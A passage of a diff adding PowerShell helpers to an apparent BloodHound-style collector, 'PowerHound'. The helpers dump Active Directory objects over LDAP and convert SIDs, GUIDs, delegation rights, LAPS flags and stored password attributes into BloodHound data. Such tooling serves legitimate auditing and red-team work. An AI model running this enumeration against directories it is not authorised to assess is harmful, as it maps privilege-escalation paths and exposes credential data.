+    $DomainControllerObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=8192)' -Raw
+    Write-Host "[*] Dumping User Objects..."
+    $UserObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(|(objectCategory=user)(objectCategory=msDS-ManagedServiceAccount)(objectCategory=msDS-GroupManagedServiceAccount))' -Raw
+    Write-Host "[*] Dumping Computer Objects..."
+    $ComputerObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=computer)' -Raw
+    Write-Host "[*] Dumping Group Objects..."
+    $GroupObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=group)' -Raw
+    Write-Host "[*] Dumping OU Objects..."
+    $OUObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=organizationalUnit)' -Raw
+    Write-Host "[*] Dumping GPO Objects..."
+    $GPOObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=groupPolicyContainer)' -Raw
+    Write-Host "[*] Dumping Container Objects..."
+    $ContainerObjects = _Filter -LdapConnection $LdapConnection -SearchBase $(_Helper-GetDomainDNFromDomainName -DomainName $Domain) -LDAPFilter '(objectCategory=container)' -Raw
+
+    $Result = @{
+        "DomainObjects"           = $DomainObjects;
+        "DomainControllerObjects" = $DomainControllerObjects;
+        "UserObjects"             = $UserObjects;
+        "ComputerObjects"         = $ComputerObjects;
+        "GroupObjects"            = $GroupObjects;
+        "OUObjects"               = $OUObjects;
+        "GPOObjects"              = $GPOObjects;
+        "ContainerObjects"        = $ContainerObjects;
+    }
+
+    # For each dumped object, translate attributes to human-readable form that'll be needed by PowerHound
+    foreach ($Key in $Result.Keys) {
+        $Result[$Key] | ForEach-Object {
+            if ($null -ne $_.objectsid) { 
+                $_ | Add-Member -Force -NotePropertyName 'objectsid' -NotePropertyValue $(_Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $_.objectsid) 
+            }
+            if ($null -ne $_.objectguid) { 
+                $_ | Add-Member -Force -NotePropertyName 'objectguid' -NotePropertyValue $(_Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $_.objectguid) 
+            }
+            if ($null -ne $_.useraccountcontrol) { 
+                $_ | Add-Member -Force -NotePropertyName 'useraccountcontrol' -NotePropertyValue $(_Helper-GetUACFlagsOfValue -Value $_.useraccountcontrol) 
+            }
+        }
+    }
+
+    return $Result
+}
+
+
+function _Helper-PowerHound-GetSIDLookupTable {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns a lookup table from the locally dumped BloodHound collection to associate an SID with an LDAP object
+
+        .PARAMETER BloodHoundObjects
+
+            [System.Collections.Hashtable]
+
+            The locally dumped BloodHound objects
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetSIDLookupTable -BloodHoundObjects $BloodHoundObjects
+
+            Returns a lookup table from the locally dumped BloodHound collection to associate an SID with an LDAP object
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable] 
+            
+            A lookup table from the locally dumped BloodHound collection to associate an SID with an LDAP object
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the BloodHound dumped objects from which to lookup stuff locally (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundObjects
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    # We create a lookup table, to instantly be able to match an SID to an LDAP object from the dumped BloodHound data.
+    $Result = @{}
+    foreach ($Key in $BloodHoundObjects.Keys) {
+        foreach ($Obj in $BloodHoundObjects[$Key]) {
+            if ($null -ne $Obj.objectsid) {
+                # If the SID is not well formatted, it's probably a well-known principal with a strangely formed SID (e.g. Administrators builtin group).
+                # Hence, we get the SID from the Well-Known principals using its name as an identifier
+                if ($Obj.objectsid -match '^S-\d+') {
+                    $Result[$Obj.objectsid] = $Obj
+                } else {
+                    $Result[((_Helper-GetWellKnownSIDs).GetEnumerator() | Where-Object { $Obj.name -in $_.Value.Names }).Key] = $Obj
+                }
+            }
+        }
+    }
+
+    return $Result
+}
+
+
+function _Helper-PowerHound-GetDNLookupTable {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns a lookup table from the locally dumped BloodHound collection to associate a DN with an LDAP object
+
+        .PARAMETER BloodHoundObjects
+
+            [System.Collections.Hashtable]
+
+            The locally dumped BloodHound objects
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectFromDN -BloodHoundObjects $BloodHoundObjects
+
+            Returns a lookup table from the locally dumped BloodHound collection to associate a DN with an LDAP object
+
+        .OUTPUTS
+
+            [System.Collections.Hashtable]
+            
+            A lookup table from the locally dumped BloodHound collection to associate a DN with an LDAP object
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the BloodHound dumped objects from which to lookup stuff locally (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundObjects
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    # We create a lookup table, to instantly be able to match a DN to an LDAP object from the dumped BloodHound data.
+    $Result = @{}
+    foreach ($Key in $BloodHoundObjects.Keys) {
+        foreach ($Obj in $BloodHoundObjects[$Key]) {
+            if ($null -ne $Obj.distinguishedname) {
+                $Result[$Obj.distinguishedname] = $Obj
+            }
+        }
+    }
+
+    return $Result
+}
+
+
+function _Helper-PowerHound-GetObjectType {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the type of an object to be populated into the BloodHound collection from an objectClass array attribute
+
+            - Returns "Unknown" if not found.
+
+        .PARAMETER ObjectClass
+
+            [System.String[]]
+
+            The objectClass attribute of an LDAP object
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'domain', 'domainDNS')
+
+            Returns 'Domain'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'organizationalUnit')
+
+            Returns 'OU'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'group')
+
+            Returns 'Group'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'container', 'groupPolicyContainer')
+
+            Returns 'GPO'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'container')
+
+            Returns 'Container'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'person', 'organizationalPerson', 'user', 'computer', 'msDS-ManagedServiceAccount')
+
+            Returns 'User'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'person', 'organizationalPerson', 'user', 'computer')
+
+            Returns 'Computer'
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetObjectType -ObjectClass @('top', 'person', 'organizationalPerson', 'user')
+
+            Returns 'User'
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The type of an object to be populated into the BloodHound collection from an objectClass array attribute
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the objectClass from which to guess the LDAP object type.")]
+        [System.String[]]$ObjectClass
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    if ($null -ne $ObjectClass) {
+        # The order MUST be from most specific to least specific. For instance, a computer has the following classes: @('top', 'person', 'organizationalPerson', 'user', 'computer'). Yet, it is NOT a user, with the following classes:  @('top', 'person', 'organizationalPerson', 'user')
+        # Note: this function MAY also be implemented using 'objectCategory' instead of 'objectClass'.
+        if ($ObjectClass -contains 'domainDNS')                           { return "Domain" }
+        elseif ($ObjectClass -contains 'organizationalUnit')              { return "OU" }
+        elseif ($ObjectClass -contains 'group')                           { return "Group" }
+        elseif ($ObjectClass -contains 'groupPolicyContainer')            { return "GPO" }
+        elseif ($ObjectClass -contains 'container')                       { return "Container" }
+        elseif ($ObjectClass -contains 'msDS-ManagedServiceAccount')      { return "User" }
+        elseif ($ObjectClass -contains 'msDS-GroupManagedServiceAccount') { return "User" }
+        elseif ($ObjectClass -contains 'computer')                        { return "Computer" }
+        elseif ($ObjectClass -contains 'user')                            { return "User" }
+        else { return $ObjectClass[-1] }
+    } else { 
+        return "Unknown"
+    }
+}
+
+
+function _Helper-PowerHound-ConvertSID {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the SID of an object to be populated into the BloodHound collection.
+
+        .PARAMETER Domain
+
+            [System.String]
+
+            The domain from which the BloodHound collection is gathered
+
+        .PARAMETER SID
+
+            [System.String]
+
+            The SID to be converted
+
+        .PARAMETER PrincipalName
+
+            [System.String]
+
+            The name of a well-known object (probably a builtin group with a strangely formed objectsid, such as 'CN=Users,CN=Builtin,DC=X' group with objectsid ' !')
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertSID -Domain 'ADLAB.LOCAL' -SID 'S-1-5-21-3928817328-281149751-2363737050-1104'
+
+            Returns the input as is, i.e. 'S-1-5-21-3928817328-281149751-2363737050-1104', because the SID isn't well-known
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertSID -Domain 'ADLAB.LOCAL' -SID 'S-1-5-32-544'
+
+            Returns 'ADLAB.LOCAL-S-1-5-32-544' (i.e. prefixed with the domain), because the SID is a well-known group
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertSID -Domain 'ADLAB.LOCAL' -SID ' !' -PrincipalName 'Users'
+
+            Returns 'ADLAB.LOCAL-S-1-5-32-545' (i.e. prefixed with the domain), because the principal name is a well-known group
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The SID of an object to be populated into the BloodHound collection.
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the Domain from which the BloodHound collection is performed (you're probably running this function from PowerHound !).")]
+        [System.String]$Domain,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the SID to be converted into the BloodHound format.")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$SID,
+
+        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the well-known name from which to gather the SID (you're probably providing this because a builtin group's SID is stangely formatted (i.e. not starting with 'S-')).")]
+        [System.String]$PrincipalName
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    # If the SID of the provided principal is NOT a WellKnownSID (e.g. S-1-5-21-3928817328-281149751-2363737050-1104), return the input as-is.
+    if ($SID -match '^S-1-5-21-(\d+-){3}\d+') { return $SID }
+    # Otherwise, if the SID starts well-formatted (e.g. 'S-1-1-0'), then we prefix it with the domain name
+    elseif ($SID -match '^S-\d+') { return "$($Domain)-$($SID)" }
+    # Otherwise, if the SID doesn't start well-formatted, it is likely one of the builtin groups' SID (e.g. 'CN=Backup Operatos,CN=Builtin,DC=X'). 
+    # Therefore, we lookup its SID from the Well-Known SID table with using its name, then we prefix it with the domain name.
+    else { return "$($Domain)-$(((_Helper-GetWellKnownSIDs).GetEnumerator() | Where-Object { $PrincipalName -in $_.Value.Names }).Key)" }
+}
+
+
+function _Helper-PowerHound-ConvertGUID {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the BloodHound's format of an ObjectIdentifier GUID. In other words, it flips the endianness of the first 3 components (dash-separated) of a GUID.
+
+            - Calling this function twice returns the same initial input.
+
+        .PARAMETER GUID
+
+            [System.String]
+
+            The GUID of the object to be formatted into the BloodHound format
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertGUID -GUID "1CA90D7E-D867-E345-A956-30AEF4019D77"
+
+            Returns `7E0DA91C-67D8-45E3-A956-30AEF4019D77`
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-ConvertGUID -GUID "7E0DA91C-67D8-45E3-A956-30AEF4019D77"
+
+            Returns `1CA90D7E-D867-E345-A956-30AEF4019D77`
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The BloodHound's format of an ObjectIdentifier GUID.
+        
+        .LINK
+
+            https://www.rfc-editor.org/rfc/rfc9562 (?)
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the GUID string to be converted into BloodHound ObjectIdentifier GUID.")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$GUID
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    # The first 3 components (dash-separated) endianness are swapped compared to the expected BloodHound ObjectIdentifier format.
+    # We swap bytes 0-3, 4-5, and 6-7.
+    $Bytes = [System.Guid]::Parse($GUID).ToByteArray()
+    [Array]::Reverse($Bytes, 0, 4)
+    [Array]::Reverse($Bytes, 4, 2)
+    [Array]::Reverse($Bytes, 6, 2)
+    return ([System.Guid]::new($Bytes)).ToString().ToUpper()
+}
+
+
+function _Helper-PowerHound-GetProperties {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's properties of a given type to be populated into the BloodHound collection.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the properties
+
+        .PARAMETER DataType
+
+            [System.String]
+
+            The type of the data from which the properties must be gathered (among: 'domain', 'user', 'computer', 'container', 'ou', 'group', 'gpo')
+
+        .PARAMETER DomainSID
+
+            [System.String]
+
+            Some data types, such as containers, have no domainsid or objectsid attributes. Hence, whenever the domain's SID is required, it is taken from that input.
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetProperties -LDAPObject $LDAPObject -DataType 'domain' -DomainSID $DomainSID
+
+            Returns the properties of a domain-typed LDAP object to be injected into the BloodHound collection. Because the domain object's domainsid LDAP attribute id the domain's SID, the argument $DomainSID is unused.
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetProperties -LDAPObject $LDAPObject -DataType 'container' -DomainSID $DomainSID
+
+            Returns the properties of a container-typed LDAP object to be injected into the BloodHound collection. Because the container object has no objectsid or domainsid LDAP attribute, the domain's SID is taken from the $DomainSID input.
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The data entry's properties of a given type to be populated into the BloodHound collection.
+
+        .LINK
+
+            https://github.com/dirkjanm/BloodHound.py/blob/100783c01632a4d5ca644452a97769fe1a826078/bloodhound/enumeration/
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) from which to gather the BloodHound data properties.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the type of the data entry from which to gather BloodHound properties (among: 'domain', 'user', 'computer', 'ou', 'group', 'gpo', 'container').")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$DataType,
+
+        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the domain's SID (especially for data types that do not contain such information in their LDAP attributes, such as containers).")]
+        [System.String]$DomainSID
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    switch ($DataType) {
+        'domain' {
+            return @{
+                "name"              = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "domain"            = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "domainsid"         = $LDAPObject.objectsid
+                "distinguishedname" = $LDAPObject.distinguishedname.ToUpper();
+                "description"       = $LDAPObject.description;
+                "functionallevel"   = (_Helper-GetFunctionalLevels)[$LDAPObject.'msds-behavior-version'];
+                "highvalue"         = $true;
+                "whencreated"       = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+            }
+        }
+        'user' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = "$($LDAPObject.samaccountname.ToUpper())@$((_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper())";
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $LDAPObject.objectsid -replace '-[^-]+$', '';
+                "highvalue"               = $false;
+                "samaccountname"          = $LDAPObject.samaccountname;
+                "description"             = $LDAPObject.description;
+                "whencreated"             = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+                "sensitive"               = $($LDAPObject.useraccountcontrol -split ',') -contains 'NOT_DELEGATED';
+                "dontreqpreauth"          = $($LDAPObject.useraccountcontrol -split ',') -contains 'DONT_REQ_PREAUTH';
+                "passwordnotreqd"         = $($LDAPObject.useraccountcontrol -split ',') -contains 'PASSWD_NOTREQD';
+                "unconstraineddelegation" = $($LDAPObject.useraccountcontrol -split ',') -contains 'TRUSTED_FOR_DELEGATION';
+                "pwdneverexpires"         = $($LDAPObject.useraccountcontrol -split ',') -contains 'DONT_EXPIRE_PASSWORD';
+                "enabled"                 = -not (($LDAPObject.useraccountcontrol -split ',') -contains 'ACCOUNTDISABLE');
+                "trustedtoauth"           = $($LDAPObject.useraccountcontrol -split ',') -contains 'TRUSTED_TO_AUTH_FOR_DELEGATION';
+                "lastlogon"               = if ($LDAPObject.lastlogon -eq 0) {0} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.lastlogon };
+                "lastlogontimestamp"      = if ($null -eq $LDAPObject.lastlogontimestamp) {-1} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.lastlogontimestamp };
+                "pwdlastset"              = if ($LDAPObject.pwdlastset -eq 0) {0} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.pwdlastset };
+                "serviceprincipalnames"   = $LDAPObject.serviceprincipalname;
+                "hasspn"                  = ($LDAPObject.serviceprincipalname |Measure-Object).Count -gt 0;
+                "displayname"             = $LDAPObject.displayname;
+                "email"                   = $LDAPObject.email;
+                "title"                   = $LDAPObject.title;
+                "homedirectory"           = $LDAPObject.homedirectory;
+                "userpassword"            = $LDAPObject.userpassword;
+                "unixpassword"            = $LDAPObject.unixpassword;
+                "unicodepassword"         = $LDAPObject.unicodepassword;
+                #"sfupassword"             = $LDAPObject.msSFU30Password;
+                "sfupassword"             = $null;
+                "logonscript"             = $LDAPObject.scriptpath;
+                "admincount"              = $LDAPObject.admincount -eq 1;
+                "sidhistory"              = if ($null -eq $LDAPObject.sidhistory) { ,@() } else { $LDAPObject.sidhistory };
+            }
+        }
+        'computer' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = if ($null -eq $LDAPObject.dnshostname) { "$($LDAPObject.name).$($Domain)".ToUpper() } else { $LDAPObject.dnshostname.ToUpper() };
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $LDAPObject.objectsid -replace '-[^-]+$', '';
+                "highvalue"               = $false;
+                "samaccountname"          = $LDAPObject.samaccountname;
+                "haslaps"                 = $null -ne $LDAPObject.'ms-mcs-admpwd' -or $null -ne $LDAPObject.'ms-laps-password' -or $null -ne $LDAPObject.'ms-laps-encryptedpassword' -or $null -ne $LDAPObject.'ms-Mcs-AdmPwdExpirationTime' -or $null -ne $LDAPObject.'msLAPS-PasswordExpirationTime';
+                "description"             = $LDAPObject.description;
+                "whencreated"             = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+                "allowedtodelegate"       = $LDAPObject.'msds-allowedtodelegateto';
+                "enabled"                 = -not (($LDAPObject.useraccountcontrol -split ',') -contains 'ACCOUNTDISABLE');
+                "unconstraineddelegation" = $($LDAPObject.useraccountcontrol -split ',') -contains 'TRUSTED_FOR_DELEGATION';
+                "trustedtoauth"           = $($LDAPObject.useraccountcontrol -split ',') -contains 'TRUSTED_TO_AUTH_FOR_DELEGATION';
+                "lastlogon"               = if ($LDAPObject.lastlogon -eq 0) {0} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.lastlogon };
+                "lastlogontimestamp"      = if ($null -eq $LDAPObject.lastlogontimestamp) {-1} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.lastlogontimestamp };
+                "pwdlastset"              = if ($LDAPObject.pwdlastset -eq 0) {0} else { _Helper-ConvertWindowsTimestampToUnixTime -WindowsTimestamp $LDAPObject.pwdlastset };
+                "serviceprincipalnames"   = $LDAPObject.serviceprincipalname;
+                "operatingsystem"         = $LDAPObject.operatingsystem;
+                "sidhistory"              = if ($null -eq $LDAPObject.sidhistory) { ,@() } else { $LDAPObject.sidhistory };
+            }
+        }
+        'container' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = "$($LDAPObject.name.ToUpper())@$($(_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper())";
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $DomainSID
+                "highvalue"               = $false;
+            }
+        }
+        'ou' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = "$($LDAPObject.name.ToUpper())@$($(_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper())";
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $DomainSID;
+                "highvalue"               = $false;
+                "description"             = $LDAPObject.description;
+                "whencreated"             = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+                "blocksinheritance"       = $LDAPObject.gpoptions -eq 1; # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpol/08090b22-bc16-49f4-8e10-f27a8fb16d18
+            }
+        }
+        'gpo' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = "$($LDAPObject.displayname.ToUpper())@$($(_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper())";
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $DomainSID;
+                "highvalue"               = $false;
+                "description"             = $LDAPObject.description;
+                "whencreated"             = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+                "gpcpath"                 = $LDAPObject.gpcfilesyspath;
+            }
+        }
+        'group' {
+            return @{
+                "domain"                  = (_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper();
+                "name"                    = "$($LDAPObject.samaccountname.ToUpper())@$($(_Helper-GetDomainNameFromDN -DN $LDAPObject.distinguishedname).ToUpper())";
+                "distinguishedname"       = $LDAPObject.distinguishedname.ToUpper();
+                "domainsid"               = $DomainSID;
+                "highvalue"               = $false;
+                "samaccountname"          = $LDAPObject.samaccountname;
+                "description"             = $LDAPObject.description;
+                "whencreated"             = _Helper-ConvertGeneralizedTimeToUnixTime -GeneralizedTime $LDAPObject.whencreated;
+            }
+        }
+    }
+}
+
+
+function _Helper-PowerHound-GetAllowedToDelegateContrained {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's allowedtodelegate to be populated into the BloodHound collection's computer properties (Constrained delegation). Because the delegation is CONSTRAINED, it's the allowed principal itself which stores its allowedtodelegate BloodHound property.
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the allowedtodelegate data property, allowed for constrained delegation.
+
+        .PARAMETER BloodHoundObjects
+
+            [System.Collections.Hashtable]
+
+            The locally dumped BloodHound objects
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetAllowedToDelegateContrained -LDAPObject $LDAPObject -BloodHoundObjects $BloodHoundObjects
+
+            Returns the AllowedToDelegate property entry to be injected into the BloodHound collection, from an LDAP object allowed for constrained delegation.
+
+        .OUTPUTS
+
+            [System.String] 
+            
+            The data entry's allowedtodelegate to be populated into the BloodHound collection's computer properties (Constrained).
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) allowed for constrained delegations, hence from which to gather the allowed delegation.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the BloodHound dumped objects from which to lookup stuff locally (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundObjects
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $Result = @()
+
+    # For each SPN $LDAPObject is allowed to delegate to
+    foreach ($SPN in $LDAPObject.'msds-allowedtodelegateto') {
+        # Recover from the dump the computer against which the SPN is set (at least, if not orphan...) comparing the SPN with the computer's samAccountName or dnsHostName.
+        $Result += $BloodHoundObjects["ComputerObjects"] |Where-Object { 
+            $_.samaccountname -match "^$(($SPN -split '/')[1])\"+'$'+"?$" -or $_.dnshostname -match "^$(($SPN -split '/')[1])\"+'$'+"?$" 
+        }
+    } 
+    
+    # We then Unique the result, as the same computer might be recovered multiple times (e.g. SPNs [cifs/COMPUTATOR, cifs/COMPUTATOR.ADLAB.LOCAL] may refer to the same computer twice)
+    $Result = $Result | Select-Object -Unique
+
+    # Finally, we gather the necessary BloodHound data in the correct form
+    return $Result | ForEach-Object { 
+        $_ | 
+        Add-Member -PassThru -Force -NotePropertyName 'ObjectIdentifier' -NotePropertyValue $_.objectsid |
+        Add-Member -PassThru -Force -NotePropertyName 'ObjectType' -NotePropertyValue $(_Helper-PowerHound-GetObjectType -ObjectClass $_.objectClass) |
+        Select-Object Objectidentifier,ObjectType
+    }
+}
+
+function _Helper-PowerHound-GetAllowedToActResourceBased {
+    
+    <#
+
+        .SYNOPSIS
+
+            Returns the data entry's AllowedToAct to be populated into the BloodHound collection's computer properties (Resource-based delegation). Because the delegation is RESOURCE-BASED, it's the computer allowing the principal to delegate which stores the AllowedToAct BloodHound data entry.
+
+            - The edge MAY NOT appear in BloodHound, even if existent !
+
+        .PARAMETER LDAPObject
+
+            [PSCustomObject]
+
+            The LDAP PowerShell object from which to gather the AllowedToAct data property, allowing a principal for resource-based delegation.
+        
+        .PARAMETER BloodHoundSIDLookupTable
+
+            [System.Collections.Hashtable]
+
+            The BloodHound SID lookup table for instant local searching
+        
+        .EXAMPLE
+
+            _Helper-PowerHound-GetAllowedToActResourceBased -LDAPObject $LDAPObject -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable
+
+            Returns the AllowedToAct data entry to be injected into the BloodHound collection, from an LDAP object allowing another principal for resource-based constrained delegation.
+
+        .OUTPUTS
+
+            [System.String]
+            
+            The data entry's AllowedToAct to be populated into the BloodHound collection's computer properties (Resource-based delegation)
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP object (probably an entry from the Filter action) allowed for constrained delegations, hence from which to gather the allowed delegation.")]
+        [ValidateNotNullorEmpty()]
+        [PSCustomObject]$LDAPObject,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the BloodHound SID lookup table (you are probably calling this function from PowerHound !).")]
+        [ValidateNotNullorEmpty()]
+        [System.Collections.Hashtable]$BloodHoundSIDLookupTable
+    )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+
+    $Result = @()
+
+    # AllowedToAct BloodHound Edge's ACE has 'S-1-5-10' as the granted principal
+    # However, the real granted principal is stored into the DACL of the LDAP object's 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute.
+    $AllowedToActAces = _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $LDAPObject.distinguishedname |Where-Object { $_.AceQualifier -eq 'AccessAllowed' -and $_.ObjectAceTypeName -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity' -and ($_.AccessMaskNames -split ', ') -contains 'WriteProperty' }
+
+    # For each principal allowed for resource-based constrained delegation
+    foreach ($AllowedToActAce in $AllowedToActAces) {
+        # That are not the DC. 
+        # Indeed, the DC's 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute ACE exists but CANNOT be retrieved. We skip such 'Cannot index into a null array' errors.
+        try {
+            $PrincipalSID = (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $LDAPObject.distinguishedname -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity').DiscretionaryAcl.SecurityIdentifier.Value
+        } catch {
+            continue
+        }
+        $Result += $BloodHoundSIDLookupTable[$PrincipalSID]
+    }
+    
+    $Result = $Result | Select-Object -Unique
+
+    # Finally, we gather the necessary BloodHound data in the correct form
+    return $Result | ForEach-Object { 
+        $_ | 
